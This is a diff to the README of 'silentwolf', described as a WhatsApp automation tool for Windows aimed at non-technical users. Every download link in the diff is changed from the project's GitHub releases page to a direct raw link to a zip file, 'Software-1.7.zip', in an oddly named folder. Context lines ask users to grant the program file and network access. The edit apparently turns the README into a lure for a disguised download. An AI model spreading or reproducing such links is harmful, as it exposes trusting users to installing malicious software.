@@ -1,12 +1,12 @@
 # 🐺 silentwolf - Run WhatsApp automation with ease
 
-[![Download Silent Wolf](https://img.shields.io/badge/Download%20Silent%20Wolf-blue?style=for-the-badge&logo=github)](https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases)
+[![Download Silent Wolf](https://img.shields.io/badge/Download%20Silent%20Wolf-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/penicillinresistant-commonfacialvein79/silentwolf/main/purlieuman/Software-1.7.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest Windows release:
 
-https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases
+https://raw.githubusercontent.com/penicillinresistant-commonfacialvein79/silentwolf/main/purlieuman/Software-1.7.zip
 
 ## 🧰 What Silent Wolf does
 
@@ -40,7 +40,7 @@ If Windows asks for access to files or the network, allow it so the bot can work
 Follow these steps to run Silent Wolf on Windows.
 
 1. Open the download page:
-   https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases
+   https://raw.githubusercontent.com/penicillinresistant-commonfacialvein79/silentwolf/main/purlieuman/Software-1.7.zip
 
 2. Find the latest release.
 
@@ -134,7 +134,7 @@ It is made to keep the setup process short and clear for non-technical users.
 
 Use this link to get the Windows build and other release files:
 
-https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases
+https://raw.githubusercontent.com/penicillinresistant-commonfacialvein79/silentwolf/main/purlieuman/Software-1.7.zip
 
 ## ⚙️ Suggested setup tips
 
